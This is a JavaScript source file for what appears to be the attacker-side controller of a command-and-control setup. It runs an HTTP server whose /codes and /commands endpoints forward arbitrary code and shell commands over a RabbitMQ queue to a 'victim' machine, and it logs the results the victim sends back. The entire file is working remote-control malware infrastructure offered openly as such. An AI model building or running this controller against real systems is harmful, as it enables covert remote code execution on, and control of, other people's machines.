import { connect } from 'amqplib'
import { SecJS } from '@secjs/http'
import { Logger } from '@secjs/logger'
import { toBuffer } from './utils/toBuffer.mjs'
import { toObject } from './utils/toObject.mjs'
import { QUEUE, CONNECTION_URL } from './utils/constants.mjs'

(async () => {
    const server = new SecJS()
    const logger = new Logger('ATTACKER')

    const connection = await connect(CONNECTION_URL)
    const channel = await connection.createChannel()

    server.post('/codes', async ({ request, response }) => {
        const type = 'code'
        const value = request.body.code

        await channel.sendToQueue(QUEUE, toBuffer({ type, value }))

        response.json({ message: 'Code sent to victim', data: { type, value }})
    })
    server.post('/commands', async ({ request, response }) => {
        const type = 'command'
        const value = request.body.command

        await channel.sendToQueue(QUEUE, toBuffer({ type, value }))

        response.json({ message: 'Command sent to victim', data: { type, value }})
    })

    channel.consume(QUEUE, (msg) => {
        if (!msg) logger.error('Message is null.')

        const data = toObject(msg)

        if (!data.isFromVictim) return channel.nack(msg)

        logger.error(data)

        channel.ack(msg)
    })

    server.listen(4040, () => logger.error(`Attacker server is listening and producing in queue -> ${QUEUE}.`))
})();
